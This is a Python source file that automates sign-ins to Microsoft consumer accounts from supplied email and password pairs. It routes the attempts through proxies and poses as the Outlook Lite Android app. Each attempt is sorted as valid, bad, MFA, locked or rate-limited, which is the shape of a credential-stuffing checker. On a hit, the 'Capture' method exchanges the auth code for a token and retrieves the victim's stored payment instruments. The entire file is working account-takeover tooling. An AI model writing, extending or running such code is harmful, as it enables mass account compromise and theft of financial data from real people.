import requests, re

class Microsoft:
    def __init__(self):
        self.keywords = [
                (["JSH", "JSHP", 'action="https://account.live.com/Consent/Update', 'https://login.live.com/oauth20_desktop.srf?', '/Consent'], 
                ["text", "cookies", "url"], 
                "ok"),
                
                (['account or password is incorrect'], 
                ["text"], 
                "bad"),
                
                (['https://account.live.com/identity/confirm', 'https://account.live.com/recover'], 
                ["text"], 
                "mfa"),
                
                (['https://account.live.com/Abuse', 'https://login.live.com/finisherror.srf'], 
                ["text", "url"], 
                "locked"),
                
                (['too many times with', 'Too Many Requests'], 
                ["text"], 
                "retries"),
            ]       

    # -------------------------------------------------------------------------------------------------- #

    def found(self, arr, response) -> bool:
        for keyword in arr:
            if keyword in response:
                return True
            
        return False

    def Headers(self, msprequ, uaid, mspok, oparams, payload, url) -> dict:
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0","Pragma": "no-cache","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Host": "login.live.com","Connection": "keep-alive","Content-Length": str(len(payload)), "Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://login.live.com","Content-Type": "application/x-www-form-urlencoded","X-Requested-With": "com.microsoft.outlooklite","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": f"{url}",  "Accept-Encoding": "gzip, deflate","Accept-Language": "en-US,en;q=0.9","Cookie": f"MSPRequ={msprequ}; uaid={uaid}; MSPOK={mspok}; OParams={oparams}"}
        return headers

    def Payload(self, email, password, ppft) -> str:
        return f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"

    def LoginParams(self, response: requests.Response) -> list:
        a1, ppft, msprequ, uaid, mspok, oparams = None, None, None, None, None, None
        msprequ, uaid, mspok, oparams = response.cookies.get("MSPRequ"), response.cookies.get("uaid"), response.cookies.get("MSPOK"), response.cookies.get("OParams")

        url_post = re.search(r"urlPost:\s*'([^']+)'", response.text)
        a1 = url_post.group(1) if url_post else None

        ppft_match = re.search(r'<input[^>]+name="PPFT"[^>]+value="([^"]*)"', response.text)
        ppft = ppft_match.group(1) if ppft_match else None

        return a1, ppft, msprequ, uaid, mspok, oparams

    # -------------------------------------------------------------------------------------------------- #

    def Proxies(self, proxy):
        if proxy is None:
            return None
        
        return {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

    def Request(self, url, headers, payload, proxy, method: callable, redirects: bool) -> requests.Response:
        rArgs = {}

        rArgs["url"] = url

        if headers:
            rArgs["headers"] = headers

        if redirects == False:
            rArgs["allow_redirects"] = redirects

        if payload:
            rArgs["data"] = payload

        if proxy:
            rArgs["proxies"] = self.Proxies(proxy)
            rArgs["timeout"] = 100

        return method(**rArgs)
   
    # -------------------------------------------------------------------------------------------------- #

    def AuthCode(self, response: requests.Response):
        location = response.headers.get("Location")

        if location:
            code_pattern = r"code=([^&]*)"
            code = re.search(code_pattern, location).group(1) if re.search(code_pattern, location) else None

            return code
        
        return False

    def Auth(self, email, password, proxy) -> tuple:

        r = None

        try:
            r = self.Request(f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&mkt=en&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access", None, None, self.Proxies(proxy), requests.get, True)

            p1 = self.LoginParams(r)
            a1, ppft, msprequ, uaid, mspok, oparams = p1[0], p1[1], p1[2], p1[3], p1[4], p1[5]
            if a1 is None or ppft is None or msprequ is None or uaid is None or mspok is None or oparams is None:
                return "retry"
            
            payload = self.Payload(email, password, ppft)
            r = self.Request(a1, self.Headers(msprequ, uaid, mspok, oparams, payload, a1), payload, proxy, requests.post, False)

            for keywords, attrs, result in self.keywords:
                for attr in attrs:
                    content = getattr(r, attr, None)
                    if attr == "cookies" and content is not None:
                        content = str(content)
                    if content and self.found(keywords, content):
                        return result, r

            return "bad", r
        
        except Exception as e:
            print(e)
            return "retry", r
        
    def AccessToken(self, response: requests.Response, proxy):
        
        try:

            Auth = self.AuthCode(response)
            r = self.Request("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {                
                "return-client-request-id": "false",
                "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
                "Host": "login.microsoftonline.com",
                "x-client-Ver": "1.0.0+635e350c",
                "x-client-OS": "28",
                "x-client-SKU": "MSAL.xplat.android",
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "Content-Length": "323",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"}, f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={Auth}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access", self.Proxies(proxy), requests.post, True)
            
            return r.json()["access_token"]
        
        except:
            return None
        
    def Capture(self, response: requests.Response, proxy) -> dict:
        atk = self.AccessToken(response, proxy)
        
        if not atk: 
            return None

        try:

            r = self.Request("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": f"MSADELEGATE1.0=\"{atk}\"",
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Sec-GPC": "1"
            }, None, proxy, requests.get, True)
            
            return r.json()
        except:
            return None
        
